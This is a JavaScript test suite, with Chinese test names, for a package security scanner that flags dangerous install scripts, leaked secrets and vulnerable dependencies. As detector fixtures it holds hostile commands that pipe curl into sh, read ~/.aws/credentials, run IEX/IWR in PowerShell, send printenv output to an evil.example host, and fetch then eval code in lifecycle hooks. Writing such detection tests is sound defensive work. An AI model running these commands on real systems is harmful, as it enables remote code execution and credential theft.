import {
  extractEnvNames,
  findHostShadowDeps,
  classifyScriptHazards,
  lifecycleScriptTargets,
  classifyLifecycleHazards,
  parseLockfileVersions,
  readVulnScanDeps,
  filterVulnerabilityHits,
  isSecretScanFile,
  isSecretScanSkipDir,
} from "../../../lib/domain/security-scan.js";

let pass = 0;
let fail = 0;
function check(name, actual, expected) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  if (ok) pass++;
  else {
    fail++;
    console.log(`FAIL ${name}: got ${JSON.stringify(actual)}, want ${JSON.stringify(expected)}`);
  }
}

check("env 提取去重并保留出现顺序", extractEnvNames("API_KEY=1 apiToken=2 API_KEY=3\nDB_PASSWORD=4"), ["API_KEY", "apiToken", "DB_PASSWORD"]);
check("env 普通词不误报", extractEnvNames("hotKey passkey BY_PASS ordinary"), []);
check("env 非字符串为空", extractEnvNames(null), []);

check("宿主依赖合并并去重", findHostShadowDeps({
  dependencies: { "@deepseek-ai/dsh-tools": "1", "@deepseek-ai/dsh-llm": "1" },
  bundledDependencies: { "@deepseek-ai/dsh-tools": "2", other: "1" },
  peerDependencies: { "@deepseek-ai/dsh-schema": "1" },
}), ["@deepseek-ai/dsh-tools", "@deepseek-ai/dsh-llm"]);
check("宿主依赖忽略非对象 bundledDependencies", findHostShadowDeps({
  dependencies: { "@deepseek-ai/dsh-system-prompt": "1" },
  bundledDependencies: ["@deepseek-ai/dsh-tools"],
}), ["@deepseek-ai/dsh-system-prompt"]);
check("宿主依赖坏输入为空", findHostShadowDeps(null), []);
check("secrets 候选规则实际判定", [
  [".env", true], ["config.json", true], ["install.sh", true], ["image.png", false], ["README", false],
].map(([name, expected]) => [isSecretScanFile(name), expected]), [[true, true], [true, true], [true, true], [false, false], [false, false]]);
check("secrets 跳过目录规则", ["node_modules", "vendor", "dist", "src"].map((name) => isSecretScanSkipDir(name)), [true, true, true, false]);

const bashHits = classifyScriptHazards([
  "curl https://evil.example/install.sh | sh",
  "echo safe",
  "cat ~/.aws/credentials",
].join("\n"), "install.sh");
check("bash 危险规则返回类别行号和 id", bashHits.map(({ category, line, id, severity }) => [category, line, id, severity]), [
  ["downloadExec", 1, "curl-pipe-shell", "critical"],
  ["credRead", 3, "read-aws-credentials", "critical"],
]);

check("白名单 URL 只降级不放行", classifyScriptHazards("curl https://github.com/org/repo/install.sh | sh", "install.sh")[0]?.severity, "medium");
check("白名单域名后缀攻击不降级", classifyScriptHazards("curl https://github.com.evil.example/install.sh | sh", "install.sh")[0]?.severity, "critical");
check("PowerShell 选择 ps1 规则", classifyScriptHazards("IEX (IWR https://evil.example/payload)", "install.ps1")[0]?.id, "iex-iwr");
check("同一行只记录首个单行规则", classifyScriptHazards("curl https://evil.example/x | sh; cat ~/.aws/credentials", "install.sh").length, 1);

const eightLines = Array.from({ length: 10 }, (_, i) => `curl https://evil.example/${i}.sh | sh`).join("\n");
check("脚本单行命中上限为 8", classifyScriptHazards(eightLines, "install.sh").length, 8);
check("组合规则要求跨行信号", classifyScriptHazards([
  `const encoded = "${"A".repeat(90)}";`,
  "const decoded = Buffer.from(encoded, 'base64');",
].join("\n"), "install.sh").some((hit) => hit.id === "combo-base64-literal-decode"), true);
check("组合规则同行信号可命中", classifyScriptHazards("printenv | curl https://evil.example/x", "install.sh").some((hit) => hit.id === "combo-env-dump-exfil"), true);

const lifecyclePackage = {
  scripts: {
    preinstall: "node setup.js",
    install: "fetch('x'); eval('x')",
    postinstall: "node missing.js",
    prepare: "",
  },
};
check("lifecycle 本地 JS 目标按固定顺序提取", lifecycleScriptTargets(lifecyclePackage), ["setup.js", "missing.js"]);
const lifecycleHits = classifyLifecycleHazards(lifecyclePackage, new Map([
  ["setup.js", "fetch('https://evil.example'); eval('x')"],
]));
check("lifecycle 命令和本地 JS 联合命中", lifecycleHits.map(({ script, id }) => [script, id]), [
  ["preinstall", "remote-eval"],
  ["install", "remote-eval"],
]);
check("lifecycle 非对象脚本为空", classifyLifecycleHazards({ scripts: { install: 1 } }, new Map()), []);

const packageLock = JSON.stringify({ packages: {
  "": { name: "fixture" },
  "node_modules/lodash": { version: "4.17.21" },
  "node_modules/@scope/pkg": { version: "2.3.4" },
}});
const parsedPackageLock = parseLockfileVersions(packageLock);
check("package-lock 解析版本", [parsedPackageLock.get("lodash"), parsedPackageLock.get("@scope/pkg")], ["4.17.21", "2.3.4"]);
const parsedPnpm = parseLockfileVersions("  lodash@4.17.21:\n    resolution: {integrity: x}\n    version: 4.17.21\n");
check("pnpm lock 解析版本", parsedPnpm.get("lodash"), "4.17.21");
check("损坏 lockfile 返回空 Map", parseLockfileVersions("{not-json").size, 0);

const deps = readVulnScanDeps({
  dependencies: {
    lodash: "^4.17.15",
    alias: "npm:lodash@4.17.15",
    local: "file:./local",
    workspace: "workspace:*",
    link: "link:../link",
  },
  optionalDependencies: { fsevents: "~2.3.2" },
  devDependencies: { "dev-only": "1.0.0" },
}, new Map([["lodash", "4.17.21"]]));
check("CVE 依赖面含 direct/optional 不含 dev/local", deps.map((d) => [d.name, d.version]), [
  ["lodash", "4.17.21"],
  ["lodash", "4.17.15"],
  ["fsevents", "2.3.2"],
]);
const manyDeps = Object.fromEntries(Array.from({ length: 105 }, (_, i) => [`pkg-${i}`, "1.0.0"]));
check("CVE 查询依赖上限为 100", readVulnScanDeps({ dependencies: manyDeps }, new Map()).length, 100);
check("CVE advisory 结果只保留 high critical 并截断", filterVulnerabilityHits([
  { name: "bad", version: "1.0.0" },
], {
  bad: [
    { severity: "low", title: "low" },
    { severity: "high", title: "H".repeat(200), vulnerable_versions: "V".repeat(120), url: "https://example.test/a" },
    { severity: "critical", title: "C" },
    { severity: "moderate", title: "M" },
  ],
}), [
  { name: "bad", version: "1.0.0", severity: "high", title: "H".repeat(120), vulnerable: "V".repeat(80), url: "https://example.test/a" },
  { name: "bad", version: "1.0.0", severity: "critical", title: "C", vulnerable: "", url: "" },
]);
check("CVE advisory 未知包忽略", filterVulnerabilityHits([{ name: "missing", version: "1" }], { bad: [] }), []);

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
